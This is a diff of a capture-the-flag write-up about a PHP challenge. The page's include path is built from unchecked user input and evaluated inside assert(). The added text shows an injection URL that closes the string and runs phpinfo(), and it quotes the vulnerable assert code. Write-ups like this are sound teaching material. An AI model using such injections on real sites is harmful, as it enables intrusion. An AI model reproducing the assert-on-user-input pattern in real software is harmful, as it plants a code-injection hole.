@@ -59,23 +59,19 @@ Which shows that the following files exist:
     templates
 ---
 
-We examined the index.php file and found that it used assert:
+We examined the index.php file and found that it used assert. We also discovered that the $file variable is created from unchecked user input, namely the $_GET['page']. We can use $file to command inject the assert statement.
 
     <?php
 
-    if (isset($_GET['page'])) {
-	    $page = $_GET['page'];
-    } else {
-	    $page = "home";
-    }
-
-   $file = "templates/" . $page . ".php";
+    $file = "templates/" . $page . ".php";
 
     // I heard '..' is dangerous!
     assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
 
     // TODO: Make this look nice
     assert("file_exists('$file')") or die("That file doesn't exist!");
+
+    ?>
 
 Per aaraonasterling on StackOverflow: 
 >The rule of thumb which is applicable across most languages (all that I vaguely know) is that an assert is used to assert that a >condition is always true whereas an if is appropriate if it is conceivable that it will sometimes fail. (http://stackoverflow.com/questions/4516419/should-i-be-using-assert-in-my-php-code#4516444)
@@ -84,4 +80,10 @@ With this in mind, we knew the way to capture the flag was to use `assert` to ou
 
 ---    
 
+Next we pulled up the phpinfo page by injecting by typing in the following commands into the browser window:
 
+    http://web.chal.csaw.io:8000/?page=home%27).%20phpinfo();%20//
+
+Which retrieved all of the information and configuration of the website:
+
+![screen shot](https://cloud.githubusercontent.com/assets/22091364/18820566/aebaa8c0-836c-11e6-949e-5bfa89b3cade.jpg)
